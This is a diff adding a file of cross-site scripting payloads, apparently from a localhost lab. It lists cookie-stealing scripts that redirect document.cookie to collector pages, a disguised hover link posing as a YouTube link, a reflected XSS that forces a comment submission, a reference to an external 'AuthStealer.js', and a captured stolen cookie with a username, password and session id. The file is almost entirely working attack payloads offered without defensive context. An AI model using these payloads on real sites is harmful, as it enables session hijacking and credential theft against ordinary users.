@@ -1,0 +1,28 @@
+///Cookie Stealing///
+<script>alert("XSS")</script>
+<script>alert(document.cookie)</script>
+<script>window.location='http://localhost:8081/website2/cookie.php?cookie='+escape(document.cookie)</script>
+<script>window.location="http://www.google.com"</script>
+<script>window.location="http://localhost:8081/website2/index1.php"</script>
+https%3A%2F%2Fdeshmukhshivkumar.github.io%2FAuthStealer.js
+
+
+http://localhost:8081/website2/index.php?search=https%3A%2F%2Fdeshmukhshivkumar.github.io%2FAuthStealer.js
+
+
+
+//Hover attack//
+Check out This YouTube video:<a href="https://www.youtube.com/" onmouseover="window.location='http://localhost/xss/4/cookiemonster.php?cookie='+escape(document.cookie)">
+https://www.youtube.com/
+</a>
+
+///Reflected XSS Forced Comment///
+
+http://localhost:8081/website2/index1.php<script>window.onload=function(){document.getElementsByName('comment')[0].innerHTML='XSS is fun!';document.getElementById('post').submit();}</script>
+
+http://localhost/xss/4/cookiemonster.php?cookie=username%3Ddhan%3B%20password%3Ddhan%2540123%3B%20PHPSESSID%3Do1asp9ejo3utvsg2h82egb0554
+
+
+<script>window.location='http://localhost:8081/website2/cookie.php?cookie='+escape(document.cookie)</script>
+
+<a href=javascript:alert(&quot;XSS&quot;)>link Click Me! </a>
